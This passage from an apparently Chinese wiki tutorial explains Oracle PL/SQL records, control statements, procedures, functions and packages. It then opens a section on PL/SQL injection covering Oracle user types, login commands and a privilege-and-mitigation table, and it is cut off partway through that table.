books.title%TYPE;</span><br></pre></td></tr></table></figure><p>这样声明my_title有两个优点，第一，我们不必知道title具体类型；第二，如果我们改变了数据库中对该字段的数据类型定义的话，my_title的数据类型会在运行时做出相应的改变，并不需要手动地进行维护。</p><ul><li>%ROWTYPE</li></ul><p>在PL/SQL中，记录用于将逻辑相关数据组织起来。一个记录是由许多相关域的组合。%ROWTYPE属性返回一个记录类型，其数据类型和数据表的数据结构相一致。这样的记录类型可以完全保存从数据表中查询(SELECT)或从游标/游标变量取出(FETCH)的行记录。</p><p>行中的字段和记录中的域对应的名称和数据类型都完全一致。下面的例子中，我们声明一个dept_rec的记录。它的域名称和数据类型与表dept中的字段名称和数据类型就完全一样。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DECLARE  dept_rec  dept%ROWTYPE;  -- declare record variable</span><br></pre></td></tr></table></figure><p>我们可以使用”.”来引用记录中的域。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">my_deptno := dept_rec.deptno;</span><br></pre></td></tr></table></figure><p>假设我们声明了一个用于检索雇员的名字、工资、雇用日期和职称的游标，我们就可以使用%ROWTYPE来声明一个类型相同的记录，如下例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">DECLARE</span><br><span class="line"> CURSOR c1 IS</span><br><span class="line">  SELECT ename, sal, hiredate, job</span><br><span class="line">   FROM emp;</span><br><span class="line"></span><br><span class="line"> emp_rec  c1%ROWTYPE;  -- declare record variable that represents</span><br><span class="line">             -- a row fetched from the emp table</span><br></pre></td></tr></table></figure><p>当我们执行语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FETCH c1 INTO emp_rec;</span><br></pre></td></tr></table></figure><p>表emp中ename字段的值就会赋给emp_rec的ename域，sal字段值赋给sal域，依此类推。</p><h3 id="1-3-PL-SQL-控制语句"><a href="#1-3-PL-SQL-控制语句" class="headerlink" title="1.3 PL/SQL 控制语句"></a>1.3 PL/SQL 控制语句</h3><h4 id="1-3-1-简单IF结构"><a href="#1-3-1-简单IF结构" class="headerlink" title="1.3.1 简单IF结构"></a>1.3.1 简单IF结构</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">IF &lt;布尔表达式&gt; THEN</span><br><span class="line">    满足条件时执行的语句</span><br><span class="line">END IF;</span><br></pre></td></tr></table></figure><h4 id="1-3-2-IF-ELSE结构"><a href="#1-3-2-IF-ELSE结构" class="headerlink" title="1.3.2 IF-ELSE结构"></a>1.3.2 IF-ELSE结构</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">IF &lt;布尔表达式&gt; THEN</span><br><span class="line">    满足条件时执行的语句</span><br><span class="line">ELSE</span><br><span class="line">    不满足条件时执行的语句</span><br><span class="line">END IF;</span><br></pre></td></tr></table></figure><h4 id="1-3-3-多重IF"><a href="#1-3-3-多重IF" class="headerlink" title="1.3.3 多重IF"></a>1.3.3 多重IF</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">IF &lt;布尔表达式1&gt; THEN</span><br><span class="line">    满足条件1时执行的语句</span><br><span class="line">ELSIF &lt;布尔表达式2&gt; THEN</span><br><span class="line">    满足条件2时执行的语句</span><br><span class="line">ELSIF &lt;布尔表达式3&gt; THEN</span><br><span class="line">    满足条件3时执行的语句</span><br><span class="line">ELSE</span><br><span class="line">    满足条件1、2、3均不满足时执行的语句</span><br><span class="line">END IF;</span><br></pre></td></tr></table></figure><p>注意：ELSIF不能写成ELSEIF</p><h4 id="1-3-4-CASE"><a href="#1-3-4-CASE" class="headerlink" title="1.3.4 CASE"></a>1.3.4 CASE</h4><p>语法一：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">CASE 条件表达式</span><br><span class="line">    WHEN 条件表达式结果1 THEN </span><br><span class="line">        语句1</span><br><span class="line">    WHEN 条件表达式结果2 THEN</span><br><span class="line">        语句2</span><br><span class="line">    ......</span><br><span class="line">    WHEN 条件表达式结果n THEN</span><br><span class="line">        语句n</span><br><span class="line">  [ELSE 条件表达式结果]</span><br><span class="line">END CASE;</span><br></pre></td></tr></table></figure><p>语法二：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">CASE </span><br><span class="line">  WHEN 条件表达式1 THEN</span><br><span class="line">     语句1</span><br><span class="line">  WHEN 条件表达式2 THEN</span><br><span class="line">     语句2</span><br><span class="line">  ......</span><br><span class="line">  WHEN 条件表达式n THEN </span><br><span class="line">     语句n</span><br><span class="line">  [ELSE 语句]</span><br><span class="line">END CASE;</span><br></pre></td></tr></table></figure><h4 id="1-3-5-简单循环"><a href="#1-3-5-简单循环" class="headerlink" title="1.3.5 简单循环"></a>1.3.5 简单循环</h4><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LOOP</span><br><span class="line">    循环体语句;</span><br><span class="line">    [EXIT WHEN &lt;条件语句&gt;]</span><br><span class="line">END LOOP;</span><br></pre></td></tr></table></figure><h4 id="1-3-6-WHILE循环"><a href="#1-3-6-WHILE循环" class="headerlink" title="1.3.6 WHILE循环"></a>1.3.6 WHILE循环</h4><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">WHILE &lt;布尔表达式&gt; LOOP</span><br><span class="line">    循环体语句;</span><br><span class="line">END LOOP;</span><br></pre></td></tr></table></figure><h4 id="1-3-7-FOR循环"><a href="#1-3-7-FOR循环" class="headerlink" title="1.3.7 FOR循环"></a>1.3.7 FOR循环</h4><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[&lt;&lt;标签&gt;&gt;]</span><br><span class="line">FOR 循环计数器 IN [ REVERSE ] 下限 .. 上限 LOOP</span><br><span class="line">    循环体语句;</span><br><span class="line">END LOOP [&lt;&lt;标签&gt;&gt;];</span><br></pre></td></tr></table></figure><p>说明：</p><p>使用关键字REVERSE，循环变量自动减1。跟在IN REVERSE后面的数字应是从小到大的顺序，而且必须是整数，不能是变量或表达式。</p><h4 id="1-3-8-GOTO"><a href="#1-3-8-GOTO" class="headerlink" title="1.3.8 GOTO"></a>1.3.8 GOTO</h4><p>GOTO语句用于跳转到指定&lt;&lt;标号&gt;&gt;去执行语句，是无条件跳转到指定的标号去的意思。</p><p>注意：标号是用&lt;&lt;　&gt;&gt;括起来的标识符。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GOTO label;</span><br></pre></td></tr></table></figure><p>GOTO语句缺点是会增加程序的复杂性，降低可读性，所以Oracle建议不要使用。</p><h4 id="1-3-9-NULL"><a href="#1-3-9-NULL" class="headerlink" title="1.3.9 NULL"></a>1.3.9 NULL</h4><p>空语句，执行没有任何实际效果，可以使某些语句变得有意义，提高程序的可读性，保证其他语句结构的完整性和正确性，通常用于占位置。</p><h3 id="1-4-PL-SQL-子程序"><a href="#1-4-PL-SQL-子程序" class="headerlink" title="1.4 PL/SQL 子程序"></a>1.4 PL/SQL 子程序</h3><p>子程序就是能够接受参数并被其他程序所调用的命名PL/SQL块。PL/SQL子程序有两种类型，过程和函数。</p><p>一般地，过程用于执行一个操作，而函数用于计算一个结果值。</p><p>与未命名或匿名PL/SQL块一样，子程序也有声明部分，执行部分和一个可选的异常处理部分。声明部分包含类型、游标、常量、变量、异常和嵌套子程序的声明。这些内容都是本地的，在程序退出时会自动销毁。执行部分包含赋值语句、流程控制语句和Oracle的数据操作语句。异常处理部分包含异常处理程序。思考下面用于记入借方银行账户的debit_account过程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">PROCEDURE debit_account(acct_id INTEGER, amount REAL) IS</span><br><span class="line"> old_balance  REAL;</span><br><span class="line">new_balance  REAL;</span><br><span class="line"> overdrawn   EXCEPTION;</span><br><span class="line">BEGIN</span><br><span class="line"> SELECT bal</span><br><span class="line">  INTO old_balance</span><br><span class="line">  FROM accts</span><br><span class="line">  WHERE acct_no = acct_id;</span><br><span class="line">  </span><br><span class="line">new_balance  := old_balance - amount;</span><br><span class="line"></span><br><span class="line">     IF new_balance &lt; 0 THEN</span><br><span class="line">        RAISE overdrawn;</span><br><span class="line">     ELSE</span><br><span class="line">        UPDATE accts</span><br><span class="line">            SET bal = new_balance</span><br><span class="line">        WHERE acct_no = acct_id;</span><br><span class="line">     END IF;</span><br><span class="line">EXCEPTION</span><br><span class="line"> WHEN overdrawn THEN</span><br><span class="line">  ...</span><br><span class="line">END debit_account;</span><br></pre></td></tr></table></figure><p>在被调用时，这个过程接受一个银行账号和借贷金额。它使用账号从accts表中查询账目结算信息。然后用借款金额计算新的账目结算。如果计算后的余额比零小，异常就会被抛出；否则，该账号相关信息就会被更新。</p><h4 id="1-4-1-理解PL-SQL过程"><a href="#1-4-1-理解PL-SQL过程" class="headerlink" title="1.4.1 理解PL/SQL过程"></a>1.4.1 理解PL/SQL过程</h4><p>过程是一个能执行某个特定操作的子程序。我们可以用下面的语法来编写过程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[CREATE [OR REPLACE]] </span><br><span class="line">PROCEDURE procedure_name[(parameter[, parameter]...)] </span><br><span class="line"> [AUTHID &#123;DEFINER | CURRENT_USER&#125;] &#123;IS | AS&#125;  </span><br><span class="line">[PRAGMA AUTONOMOUS_TRANSACTION;] </span><br><span class="line"> [local declarations] </span><br><span class="line">BEGIN  </span><br><span class="line">executable statements </span><br><span class="line">[EXCEPTION  </span><br><span class="line">exception handlers]</span><br><span class="line">END [name];</span><br></pre></td></tr></table></figure><p>parameter的含义如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">parameter_name [IN | OUT [NOCOPY] | IN OUT [NOCOPY]] datatype </span><br><span class="line">[&#123;:= | DEFAULT&#125; expression]</span><br></pre></td></tr></table></figure><p>CREATE子句能让我们创建保存在数据库中的独立过程。我们可以从SQLPlus中或是在使用动态SQL的程序中执行CREATE PROCEDURE语句。</p><p>AUTHID子句决定了存储过程是按所有者权限(默认)调用还是按当前用户权限执行，也能决定在没有限定修饰词的情况下，对所引用的对象是按所有者模式进行解析还是按当前用户模式进行解析。我们可以指定CURRENT_USER来覆盖掉程序的默认行为。</p><p>编译指示AUTONOMOUS_TRANSACTION会告诉PL/SQL编译器把过程标记为自治(独立)。自治事务能让我们把主事务挂起，执行SQL操作，提交或回滚自治事务，然后再恢复主事务。</p><p>我们不能对参数的数据类型进行约束，如下例中对acct_id的声明就是不合法的，因为它对CHAR类型进行了长度限制：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PROCEDURE reconcile (acct_id CHAR(5)) IS ... -- illegal</span><br></pre></td></tr></table></figure><p>但是，我们可以使用下面的方法间接的对字符的长度进行限制：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DECLARE  </span><br><span class="line">SUBTYPE Char5 IS CHAR(5);  </span><br><span class="line">PROCEDURE reconcile (acct_id Char5) IS ...</span><br></pre></td></tr></table></figure><p>过程有两个部分，过程说明和过程体。说明部分由关键字PROCEDURE开头，以过程名或参数列表结尾。参数声明是可选的。没有参数的过程是不用使用圆括号的。</p><p>过程体由关键字IS(或AS)开头，并以END结尾，END后面可以跟上一个可选的过程名。过程体有三个部分：声明、执行和可选的异常处理。</p><p>声明部分包括本地声明，它处于IS和BEGIN之间。在匿名PL/SQL块使用的关键字DECLARE在这里不再需要。执行部分包括许多语句，它们被放到BEGIN和EXCEPTION(或END)之间，并且至少要有一条语句出现在过程的执行部分。NULL语句可以满足这个需求。异常处理部分包含异常处理程序，它被放在关键字EXCEPTION和END之间。</p><p>在下面的过程raise_salary中，我们会根据给定的金额来为雇员加薪：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">PROCEDURE raise_salary(emp_id INTEGER, amount REAL) IS  </span><br><span class="line">current_salary  REAL;  </span><br><span class="line">salary_missing  EXCEPTION; </span><br><span class="line">BEGIN  </span><br><span class="line">SELECT sal   </span><br><span class="line">INTO current_salary   </span><br><span class="line">FROM emp   </span><br><span class="line">WHERE empno = emp_id;   </span><br><span class="line"></span><br><span class="line">IF current_salary IS NULL THEN   </span><br><span class="line">RAISE salary_missing;  </span><br><span class="line">ELSE   </span><br><span class="line">UPDATE emp    </span><br><span class="line">        SET sal = sal + amount    </span><br><span class="line">        WHERE empno = emp_id;  </span><br><span class="line">    END IF; </span><br><span class="line"></span><br><span class="line">EXCEPTION  </span><br><span class="line">WHEN NO_DATA_FOUND THEN   </span><br><span class="line">INSERT INTO emp_audit      </span><br><span class="line">VALUES (emp_id, *&#x27;No such number&#x27;*);  </span><br><span class="line">WHEN salary_missing THEN   </span><br><span class="line">INSERT INTO emp_audit      </span><br><span class="line">VALUES (emp_id, *&#x27;Salary is null&#x27;*); </span><br><span class="line">END raise_salary;</span><br></pre></td></tr></table></figure><p>在调用时，过程接受雇员编号和薪资调整金额，然后用雇员编号从emp表找出指定雇员的当前工资。如果雇员编号无法找到或是当前工资为空，异常就会被抛出，否则工资就会被更新。</p><p>过程可以作为一个PL/SQL语句来调用。例如，我们可以像下面这样调用raise_salary：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">raise_salary(emp_id, amount);</span><br></pre></td></tr></table></figure><h4 id="1-4-2-理解PL-SQL函数"><a href="#1-4-2-理解PL-SQL函数" class="headerlink" title="1.4.2 理解PL/SQL函数"></a>1.4.2 理解PL/SQL函数</h4><p>函数是一个能够计算结果值的子程序，函数除了有一个RETURN子句之外，其它结构跟过程类似。我们可以用下面的语法来编写(本地)函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[CREATE [OR REPLACE ] ]  </span><br><span class="line">FUNCTION function_name [ ( parameter [ , parameter ]... ) ] RETURN datatype  </span><br><span class="line">[ AUTHID &#123; DEFINER | CURRENT_USER &#125; ]  </span><br><span class="line">[ PARALLEL_ENABLE  </span><br><span class="line">[ &#123; [CLUSTER parameter BY (column_name [, column_name ]... ) ] |  </span><br><span class="line">[ORDER parameter BY (column_name [ , column_name ]... ) ] &#125; ]  </span><br><span class="line">[ ( PARTITION parameter BY  &#123; </span><br><span class="line">[ &#123;RANGE | HASH &#125; (column_name [, column_name]...)] | ANY &#125;  </span><br><span class="line">) ]  </span><br><span class="line">]  </span><br><span class="line">[DETERMINISTIC] [ PIPELINED [ USING implementation_type ] ]  </span><br><span class="line">[ AGGREGATE [UPDATE VALUE] [WITH EXTERNAL CONTEXT]  </span><br><span class="line">USING implementation_type ] &#123;IS | AS&#125;  </span><br><span class="line">[ PRAGMA AUTONOMOUS_TRANSACTION; ]  </span><br><span class="line">[ local declarations ] </span><br><span class="line">BEGIN  </span><br><span class="line">executable statements </span><br><span class="line">[ EXCEPTION  </span><br><span class="line">exception handlers ] </span><br><span class="line">END [ name ];</span><br></pre></td></tr></table></figure><p>函数的语法结构与过程类似，这里就不再重复。但有几个不同点还是需要注意的。</p><p>PARALLEL_ENABLE选项能声明一个在并发DML操作的从属会话(slave session)中被安全调用的存储函数。主(logon)会话的状态不会被从属会话所共享。每个从属会话都有它自己的状态，这是在会话开始时初始化的。函数的结果不应依赖于会话(静态)变量的状态。否则结果就可能随着会话而发生变化。</p><p>提示DETERMINISTIC能帮助优化程序避免冗余的函数调用。如果存储函数的调用跟前一次调用时所使用的参数相同，优化程序就直接选出前一次的计算结果值。函数结果不应该依赖于会话变量或模式对象的状态。否则结果会随着调用而发生变化。只有DETERMINISTIC函数才允许被函数索引或是参数query_rewrite_enabled为TRUE的实体化视图调用。</p><p>我们不能对参数或是函数返回值的类型添加约束，但可以像前面的过程那样使用间接的约束方法。</p><h3 id="1-5-包-Package"><a href="#1-5-包-Package" class="headerlink" title="1.5 包-Package"></a>1.5 包-Package</h3><p>PL/SQL可以让我们把逻辑相关的类型、变量、游标和子程序放在一个包内，这样更加清楚易理解。包通常有两部分组成：包说明部分和包体部分。包说明部分是应用程序的接口，它声明了类型、常量、变量、异常、游标和可以使用的子程序。包体用于实现包说明部分声明的子程序和游标。</p><p>下面的例子是把两个雇用相关的过程进行打包：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">CREATE PACKAGE emp_actions AS  -- package specification</span><br><span class="line">PROCEDURE hire_employee(empno NUMBER, ename CHAR, ...);</span><br><span class="line"></span><br><span class="line"> PROCEDURE fire_employee(emp_id NUMBER);</span><br><span class="line">END emp_actions;</span><br><span class="line"></span><br><span class="line">CREATE PACKAGE BODY emp_actions AS  -- package body</span><br><span class="line"> PROCEDURE hire_employee(empno NUMBER, ename CHAR, ...) IS</span><br><span class="line"> BEGIN</span><br><span class="line">  INSERT INTO emp</span><br><span class="line">    VALUES (empno, ename, ...);</span><br><span class="line"> END hire_employee;</span><br><span class="line"></span><br><span class="line"> PROCEDURE fire_employee(emp_id NUMBER) IS</span><br><span class="line"> BEGIN</span><br><span class="line">  DELETE FROM emp</span><br><span class="line">     WHERE empno = emp_id;</span><br><span class="line"> END fire_employee;</span><br><span class="line">END emp_actions;</span><br></pre></td></tr></table></figure><p>只有在包说明中声明的内容对应用程序是可见的，而包体中的内容是不可见，无法访问的。包被编译后会存放到数据库中，当我们首次调用包中的子程序时，整个包就会被加载到内存当中，所以，后续的调用不再涉及到磁盘的读取问题。因此，包可以提高效率改善性能。</p><h4 id="1-4-1-PL-SQL包的优点"><a href="#1-4-1-PL-SQL包的优点" class="headerlink" title="1.4.1 PL/SQL包的优点"></a>1.4.1 PL/SQL包的优点</h4><p>包提供了几个优点：模块化、方便应用程序设计、信息隐藏、附加功能和良好的性能。</p><ul><li>模块化</li></ul><p>包能让我们把逻辑相关的类型、常量、变量、异常和子程序等放到一个命名的PL/SQL模块中。每一个包都容易理解，包与包之间接口简单、清晰。这将有助于程序开发。</p><ul><li>轻松的程序设计</li></ul><p>设计应用程序时，我们首先要确定的是包说明中的接口信息。我们可以在没有包体的条件下编写并编译说明部分。然后引用该包的存储子程序也会被编译。在完成整个应用程序之前，我们是不需要完全实现包体部分的。</p><ul><li>信息隐藏</li></ul><p>有了包，我们就可以指定哪些类型、常量、变量、异常和子程序等是公有(可见和可访问)或私有(隐藏和不可访问)。例如，如果一个包里包含了四个子程序，其中三个是公有的一个是私有的。包就会隐藏私有子程序的实现，这样的话，如果实现内容发生改变，受到影响的只有包本身(不是我们的应用程序)。同样，对用户隐藏实现细节也能保证包的完整性。</p><ul><li>附加功能</li></ul><p>打包公有变量和游标在一个会话期会一直存在。所以，它们可以被当前环境下的所有子程序共享。并且它们允许我们跨事务来维护数据而不用把它保存在数据库中。</p><ul><li>良好的性能</li></ul><p>在我们首次调用打包子程序时，整个包就会被加载到内存中。所以，以后调用包中的相关子程序时，就不需要再次读取磁盘了。包能阻塞级联依赖，这样就能避免不必要的编译。例如，如果我们改变打包函数的实现，Oracle不需要重新编译调用子程序，因为它们并不依赖于包体。</p><h4 id="1-4-2-理解包体"><a href="#1-4-2-理解包体" class="headerlink" title="1.4.2 理解包体"></a>1.4.2 理解包体</h4><p>包体是对包说明的实现。也就是说包体中包含了包说明中声明的每一个游标和子程序的实现。一定要记住，包体内实现的内容只有在包说明中声明之后才能在包外引用。为了匹配包说明和包体，PL/SQL做了一个token-by-token的子程序头比较。所以，除了空白内容，头部内容必须完全一致。否则，PL/SQL就会抛出异常，如下例所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">CREATE PACKAGE emp_actions AS</span><br><span class="line">...</span><br><span class="line"> PROCEDURE calc_bonus(date_hired emp.hiredate%TYPE, ...);</span><br><span class="line">END emp_actions;</span><br><span class="line"></span><br><span class="line">CREATE PACKAGE BODY emp_actions AS</span><br><span class="line"> ...</span><br><span class="line"> PROCEDURE calc_bonus(date_hired DATE, ...) IS</span><br><span class="line">-- parameter declaration raises an exception because &#x27;DATE&#x27;*</span><br><span class="line"> -- does not match &#x27;emp.hiredate%TYPE&#x27; word for word*</span><br><span class="line">BEGIN </span><br><span class="line">... </span><br><span class="line">END;</span><br><span class="line">END emp_actions;</span><br></pre></td></tr></table></figure><h4 id="1-4-3-包特性的例子"><a href="#1-4-3-包特性的例子" class="headerlink" title="1.4.3 包特性的例子"></a>1.4.3 包特性的例子</h4><p>下面是一个名为emp_actions的包。包说明声明了类型、游标、异常和子程序：</p><ol><li>类型EmpRecTyp和DeptRecTyp</li><li>游标desc_salary</li><li>异常invalid_salary</li><li>函数hire_employee和raise_salary</li><li>过程fire_empire和raise_salary</li></ol><p>在编写包之后，我们就可以开发引用它声明的类型，调用它的子程序、游标和异常的应用程序。创建包时，它就会被存放在Oracle数据库中供广泛地调用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">CREATE PACKAGE emp_actions AS</span><br><span class="line"> /* Declare externally visible types, cursor, exception. */</span><br><span class="line">TYPE emprectyp IS RECORD(</span><br><span class="line">emp_id  INT,</span><br><span class="line">  salary  REAL</span><br><span class="line"> );</span><br><span class="line"></span><br><span class="line">TYPE deptrectyp IS RECORD(</span><br><span class="line">dept_id  INT,</span><br><span class="line">  LOCATION  VARCHAR2</span><br><span class="line"> );</span><br><span class="line"></span><br><span class="line">CURSOR desc_salary RETURN emprectyp;</span><br><span class="line"></span><br><span class="line">invalid_salary  EXCEPTION;</span><br><span class="line"></span><br><span class="line"> /* Declare externally callable subprograms. */</span><br><span class="line">FUNCTION hire_employee(</span><br><span class="line"> ename  VARCHAR2,</span><br><span class="line">  job   VARCHAR2,</span><br><span class="line">  mgr   REAL,</span><br><span class="line">  sal   REAL,</span><br><span class="line">  comm   REAL,</span><br><span class="line">  deptno  REAL</span><br><span class="line"> )</span><br><span class="line">  RETURN INT;</span><br><span class="line"></span><br><span class="line">PROCEDURE fire_employee(emp_id INT);</span><br><span class="line"></span><br><span class="line">PROCEDURE raise_salary(emp_id INT, grade INT, amount REAL);</span><br><span class="line"></span><br><span class="line">FUNCTION nth_highest_salary(n INT)</span><br><span class="line">RETURN emprectyp;</span><br><span class="line">END emp_actions;</span><br></pre></td></tr></table></figure><h2 id="2-PL-SQL-注入漏洞"><a href="#2-PL-SQL-注入漏洞" class="headerlink" title="2.PL/SQL 注入漏洞"></a>2.PL/SQL 注入漏洞</h2><h3 id="2-1-Oracle-权限"><a href="#2-1-Oracle-权限" class="headerlink" title="2.1 Oracle 权限"></a>2.1 Oracle 权限</h3><p>在创建用户之前，可以登录系统管理员权限去创建一个用户（因为系统管理员有这个权限），下面是三种用户分类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sys；   //系统管理员，拥有最高权限</span><br><span class="line">system；//本地管理员，次高权限</span><br><span class="line">scott； //普通用户，密码默认为tiger,默认未解锁</span><br></pre></td></tr></table></figure><p>在登陆的时候，可以选择下面三种登录方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlplus / as sysdba；  //登陆sys帐户</span><br><span class="line">sqlplus sys as sysdba；//同上</span><br><span class="line">sqlplus scott/tiger；  //登陆普通用户scott</span><br></pre></td></tr></table></figure><p>可以参考Oracle安全标签机制（OLS-BLP模型）</p><ol><li>定义者权限（默认情况下）</li></ol><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database-PLSQL%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86/PLSQL%E6%9D%83%E9%99%90.png"></p><ol start="2"><li>调用者权限（AUTHID RURRENT_USER）</li></ol><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database-PLSQL%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86/PLSQL%E8%B0%83%E7%94%A8%E8%80%85%E6%9D%83%E9%99%90.png"></p><h3 id="2-2-PL-SQL-注入分类"><a href="#2-2-PL-SQL-注入分类" class="headerlink" title="2.2 PL/SQL 注入分类"></a>2.2 PL/SQL 注入分类</h3><table><thead><tr><th>用户权限</th><th>具体权限</th><th>漏洞数</th><th>影响广度</th><th>解决方案</th></tr></thead><tbody><tr><td>高</td><td>EXECUTE ANT PROCEDURE</td><td>多</td><td>大</td><td>降低用户权限、升级补丁、取消 public权限</td></tr><tr><td>高</td><td>CREATE ANY 